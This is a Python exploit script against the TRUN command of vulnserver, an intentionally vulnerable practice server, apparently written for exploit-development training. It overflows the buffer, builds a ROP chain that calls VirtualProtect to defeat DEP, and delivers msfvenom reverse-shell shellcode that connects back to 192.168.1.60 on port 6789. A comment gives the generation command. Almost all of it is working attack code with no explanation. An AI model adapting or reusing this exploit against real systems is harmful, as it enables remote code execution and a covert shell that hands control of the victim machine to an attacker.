import struct 
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT)  # vulnserver

VULNSRVR_CMD = b"TRUN ."  
CRASH_LEN = 6000 
OFFSET = 2006  

######
#EAX 90909090 => Nop {DONE}                                                
#ECX 0x62506f00 => flProtect {DONE}                     
#EDX 00000040 => flNewProtect {DONE}
#EBX 00000201 => dwSize - 513 {DONE}                                        
#ESP ???????? => Leave as is                                         
#EBP ???????? => Call to ESP (jmp, call, push,..)  {DONE}                  
#ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x6250609c {DONE}      
#EDI ???????? => ROP-Nop {DONE}
######

rop_nop = struct.pack("<I",0x62501022) # RETN
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xdb\xc8\xbe\xa4\x0f\xf4\x81\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x77\x17\x83\xc7\x04"
shellcode += b"\x03\xd3\x1c\x16\x74\xe7\xcb\x54\x77\x17\x0c"
shellcode += b"\x39\xf1\xf2\x3d\x79\x65\x77\x6d\x49\xed\xd5"
shellcode += b"\x82\x22\xa3\xcd\x11\x46\x6c\xe2\x92\xed\x4a"
shellcode += b"\xcd\x23\x5d\xae\x4c\xa0\x9c\xe3\xae\x99\x6e"
shellcode += b"\xf6\xaf\xde\x93\xfb\xfd\xb7\xd8\xae\x11\xb3"
shellcode += b"\x95\x72\x9a\x8f\x38\xf3\x7f\x47\x3a\xd2\x2e"
shellcode += b"\xd3\x65\xf4\xd1\x30\x1e\xbd\xc9\x55\x1b\x77"
shellcode += b"\x62\xad\xd7\x86\xa2\xff\x18\x24\x8b\xcf\xea"
shellcode += b"\x34\xcc\xe8\x14\x43\x24\x0b\xa8\x54\xf3\x71"
shellcode += b"\x76\xd0\xe7\xd2\xfd\x42\xc3\xe3\xd2\x15\x80"
shellcode += b"\xe8\x9f\x52\xce\xec\x1e\xb6\x65\x08\xaa\x39"
shellcode += b"\xa9\x98\xe8\x1d\x6d\xc0\xab\x3c\x34\xac\x1a"
shellcode += b"\x40\x26\x0f\xc2\xe4\x2d\xa2\x17\x95\x6c\xab"
shellcode += b"\xd4\x94\x8e\x2b\x73\xae\xfd\x19\xdc\x04\x69"
shellcode += b"\x12\x95\x82\x6e\x55\x8c\x73\xe0\xa8\x2f\x84"
shellcode += b"\x29\x6f\x7b\xd4\x41\x46\x04\xbf\x91\x67\xd1"
shellcode += b"\x10\xc1\xc7\x8a\xd0\xb1\xa7\x7a\xb9\xdb\x27"
shellcode += b"\xa4\xd9\xe4\xed\xcd\x70\x1f\x66\x32\x2c\x1e"
shellcode += b"\x4a\xda\x2f\x20\xa8\x9f\xb9\xc6\xa6\x8f\xef"
shellcode += b"\x51\x5f\x29\xaa\x29\xfe\xb6\x60\x54\xc0\x3d"
shellcode += b"\x87\xa9\x8f\xb5\xe2\xb9\x78\x36\xb9\xe3\x2f"
shellcode += b"\x49\x17\x8b\xac\xd8\xfc\x4b\xba\xc0\xaa\x1c"
shellcode += b"\xeb\x37\xa3\xc8\x01\x61\x1d\xee\xdb\xf7\x66"
shellcode += b"\xaa\x07\xc4\x69\x33\xc5\x70\x4e\x23\x13\x78"
shellcode += b"\xca\x17\xcb\x2f\x84\xc1\xad\x99\x66\xbb\x67"
shellcode += b"\x75\x21\x2b\xf1\xb5\xf2\x2d\xfe\x93\x84\xd1"
shellcode += b"\x4f\x4a\xd1\xee\x60\x1a\xd5\x97\x9c\xba\x1a"
shellcode += b"\x42\x25\xda\xf8\x46\x50\x73\xa5\x03\xd9\x1e"
shellcode += b"\x56\xfe\x1e\x27\xd5\x0a\xdf\xdc\xc5\x7f\xda"
shellcode += b"\x99\x41\x6c\x96\xb2\x27\x92\x05\xb2\x6d"

#### POP EAX - {DONE} 
eax = struct.pack("<I",0x625011b4) #0x625011b4: pop eax ; ret 
eax += struct.pack("<I",0x90909090) # NOP

#### POP ECX {DONE}
ecx = struct.pack("<I",0x6250120c)  # pop ecx; ret;
ecx += struct.pack("<I",0x62506f10) # RW page

#### POP EDX { DONE}
edx = struct.pack("<I",0x771073d0)  # XOR EAX,EAX # RETN
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 8
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 16
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 24
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 32
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 40
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 48
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 56
edx += struct.pack("<I",0x7593616f) # ADD EAX,8 # RETN - 64
edx += struct.pack("<I",0x77173a4a) # XCHG EAX,EDX # RETN

#### POP EBX {DONE}
ebx = struct.pack("<I",0x625011b4) #0x625011b4: pop eax ; ret --> essfunc.dll
ebx += struct.pack("<I",0xfffffdff) # -201
ebx += struct.pack("<I",0x758b29f8) # NEG EAX # RETN    ** [KERNEL32.DLL] **  
ebx += struct.pack("<I",0x75fa5599) # XCHG EAX,EBX # RETN    ** [RPCRT4.dll] **   

#### POP EBP {DONE}
ebp = struct.pack("<I",0x75f88337)# POP EBP # RETN    ** [RPCRT4.dll] ** 
ebp += struct.pack("<I",0x625011af) # jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] 

#### POP ESI {DONE}
esi = struct.pack("<I",0x625011b4  ) # pop eax; ret; --> essfunc.dll
esi += struct.pack("<I",0x6250609c) #0x6250609c: indirizzo di VirtualProtect
esi += struct.pack("<I",0x75fbe619) # MOV EAX,DWORD PTR [EAX] # RETN    ** [RPCRT4.dll] **   
esi += struct.pack("<I",0x75a01470)  # XCHG EAX,ESI # RETN    ** [WS2_32.DLL] **

#### POP EDI
edi = struct.pack("<I",0x759ca9e1) # POP EDI # RETN    ** [WS2_32.DLL] ** 
edi += rop_nop

#### PUSHAD
pushad = struct.pack("<I",0x759dcf3f) # PUSHAD # RETN    ** [WS2_32.DLL] ** 

rop = esi 
rop += ebx 
rop += edx 
rop += edi 
rop += ebp 
rop += ecx 
rop += eax 
rop += pushad 

nop = b"\x90"*16

payload = VULNSRVR_CMD
payload += b"A" * OFFSET
payload += rop_nop # ROP NOP
payload += rop
payload += nop
payload += shellcode
payload += b"C" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
